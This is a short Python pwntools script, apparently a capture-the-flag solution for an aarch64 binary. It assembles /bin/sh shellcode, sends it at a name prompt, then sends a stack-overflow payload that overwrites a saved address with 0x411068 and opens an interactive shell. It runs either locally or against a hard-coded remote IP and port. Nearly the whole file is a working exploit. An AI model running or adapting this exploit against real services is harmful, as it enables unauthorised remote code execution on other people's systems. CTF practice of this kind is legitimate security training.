#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./pwn"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
context.arch = "aarch64"
if len(sys.argv)==1:
    r=process(pwn_file)
    print vars(context.arch)
    pid=r.pid
else:
    r=remote("106.75.126.171",33865)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

print pwnlib.asm.dpkg_search_for_binutils('aarch64', 'as')
#['binutils-aarch64-linux-gnu']

print shellcraft.sh()
sh = asm(shellcraft.sh())

r.recvuntil("name:")
r.sendline(sh)

payload = 'a'*0x10 + p64(0) + p64(0x411068)
r.sendline(payload)


r.interactive()
